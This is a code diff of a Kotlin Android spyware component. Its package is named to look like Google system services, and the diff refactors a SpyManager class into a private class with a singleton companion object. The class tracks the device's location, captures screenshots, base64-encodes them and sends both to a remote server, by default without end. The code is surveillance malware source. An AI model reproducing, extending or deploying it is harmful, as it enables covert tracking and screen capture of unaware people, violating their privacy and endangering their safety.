@@ -1,5 +1,6 @@
 package com.android.google.services.spymanager
 
+import android.graphics.Bitmap
 import android.os.Build
 import android.os.CountDownTimer
 import com.android.google.constants.LocationConstants
@@ -9,6 +10,7 @@ import com.android.google.remote.models.LocationDTO
 import com.android.google.remote.models.ScreenshotDTO
 import com.android.google.services.screenshoot.IScreenshotService
 import com.android.google.services.tracker.LocationService
+import com.android.google.services.tracker.models.TrackerLocation
 import com.android.google.utils.logw
 import com.android.google.utils.toBase64
 import kotlinx.coroutines.CoroutineScope
@@ -20,7 +22,7 @@ import kotlinx.coroutines.launch
 * Optional: create manager with helper (singleton way)
 * */
 
-class SpyManager(
+private class SpyManager(
     private var remote: RemoteService,
     private var screenshotService: IScreenshotService
 ) {
@@ -37,7 +39,7 @@ class SpyManager(
     fun start(
         screenshotService: Boolean,
         locationService: Boolean,
-        lifetime: Long = SpyHelper.ENDLESS
+        lifetime: Long = ENDLESS
     ) {
         if (enabled) return
 
@@ -46,7 +48,7 @@ class SpyManager(
         if (screenshotService) enableScreenshotService()
         if (locationService) enableLocationService()
 
-        if(lifetime != SpyHelper.ENDLESS) startStopTimer(lifetime)
+        if(lifetime != ENDLESS) startStopTimer(lifetime)
     }
 
     fun stop() {
@@ -99,50 +101,50 @@ class SpyManager(
     }
 
     private fun getAndSendLocation() = CoroutineScope(Dispatchers.IO).launch {
-        val location = LocationService.getLocation()
+        val location = getLocationFromService()
         val locationDTO = LocationDTO(location.lat, location.lon)
 
         remote.sendLocation(location = locationDTO)
     }
 
+    private fun getLocationFromService(): TrackerLocation =
+        LocationService.getLocation()
+
     fun takeAndSendScreenshot() = CoroutineScope(Dispatchers.IO).launch {
-        val screenBitmap = screenshotService.takeScreenshot()
+        val screenBitmap = getScreenshotFromService()
         val base64 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             screenBitmap.toBase64()
         } else {
-            SpyHelper.BASE_BITMAP
+            BASE_BITMAP
         }
 
         val screenshotDTO = ScreenshotDTO(base64 = base64)
         remote.sendScreenshot(screenshotDTO)
     }
 
-}
+    private fun getScreenshotFromService(): Bitmap =
+        screenshotService.takeScreenshot()
 
-/*
-* Create SpyManager with SpyHelper object
-* */
+    companion object {
+        private const val BASE_BITMAP = ""
+        private const val  ENDLESS = -1L
+        private var INSTANCE: SpyManager? = null
 
-object SpyHelper {
+        fun newInstance(
+            remote: RemoteService,
+            screenshotService: IScreenshotService
+        ): SpyManager {
+            if (INSTANCE != null) return INSTANCE!!
 
-    val BASE_BITMAP = ""
-    val ENDLESS = -1L
-    private var INSTANCE: SpyManager? = null
+            val temp = SpyManager(
+                remote = remote,
+                screenshotService = screenshotService
+            )
 
-    fun initialize(
-        remote: RemoteService,
-        screenshotService: IScreenshotService
-    ): SpyManager {
-        if (INSTANCE != null) return INSTANCE!!
+            INSTANCE = temp
 
-        val temp = SpyManager(
-            remote = remote,
-            screenshotService = screenshotService
-        )
-
-        INSTANCE = temp
-
-        return temp
+            return temp
+        }
     }
 
 }
